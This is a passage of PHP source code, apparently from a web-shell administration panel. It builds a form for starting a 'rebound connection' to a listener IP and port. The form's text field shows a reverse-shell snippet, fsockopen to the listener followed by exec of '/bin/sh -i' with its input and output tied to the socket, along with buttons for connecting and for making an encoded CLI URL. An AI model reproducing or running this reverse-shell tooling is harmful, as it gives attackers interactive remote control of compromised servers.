                        "value"    => ( 'cli url : ' . $_cli_url . "\n\n" . 'cli encode url : ' . $_cli_encode_url . "\n\n" ) . ( ( empty( $_listen_ip ) || empty( $_listen_port ) ) ? ( "" ) : ( "\n\n" . '$socket = fsockopen ( "' . $_listen_ip . '" , ' . $_listen_port . ' ) ; ' . "\n\n" . '          exec ( "/bin/sh -i <&4 >&4 2>&4" ) ; ' . "\n\n" . ( ( ( ( $_errno != 0 ) || ( $_errstr != "" ) ) ) ? "The creation of a rebound connection to port {$_listen_ip}:{$_listen_port} failed with failure code {$_errno} and prompt {$_errstr}" : '' ) ) ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
                "submit"    => array (
                    "id"    => "submit_form" ,
                    "type"  => "submit" ,
                    "title" => "( Start Connect To Server )" ,
                    "name"  => "submit_form" ,
                    "value" => "start connection to server" ,
                ) ,
                "reset"     => array (
                    "id"    => "reset_form" ,
                    "type"  => "reset" ,
                    "title" => "( Reset Connection Client Environment Configuration Information )" ,
                    "name"  => "reset_form" ,
                    "value" => "reset configuration" ,
                ) ,
                "button"    => array (
                    "id"      => "button_form" ,
                    "type"    => "button" ,
                    "title"   => "( Create Connection Client Environment CLI Encode URL )" ,
                    "name"    => "button_form" ,
                    "value"   => "create cli encode url" ,
                    "display" => true ,
                    "events"  => array (
                        "onclick" => 'create_encode_url();' ,
                    ) ,
                ) ,
            );
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Shell_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_javascript  = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;}function create_encode_url(){ document.getElementById("start").value=0;if(document.forms["' . htmlentities ( $_form_name ) . '"].onsubmit()!=false){document.forms["' . htmlentities ( $_form_name ) . '"].submit();} }</script>';
            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }
}